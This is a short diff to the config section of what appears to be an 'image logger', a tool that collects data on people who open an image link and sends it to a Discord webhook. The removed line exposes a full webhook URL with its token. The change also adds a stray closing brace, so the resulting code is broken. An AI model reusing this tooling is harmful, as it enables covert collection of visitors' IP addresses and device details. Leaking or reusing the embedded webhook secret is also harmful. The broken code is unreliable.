@@ -11,12 +11,10 @@ __version__ = "v2.0"
 __author__ = "DeKrypt/HackersHaven"
 
 config = {
-
     # BASE CONFIG #
-
-    "webhook": os.environ.get("https://discord.com/api/webhooks/1505316823141453994/n4QuoJ30U1Xj12gOnCxe190q6rTVe5Zef7sD6DFKqQAjsgyXDWXc_EBp2O0dSJfApJ52"),
-
+    "webhook": os.environ.get("DISCORD_WEBHOOK"),
     "image": "https://wallpapers.com/images/hd/windows-x-p-bliss-hills-1mcl12789erasehms.jpg",
+}
 
 } # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
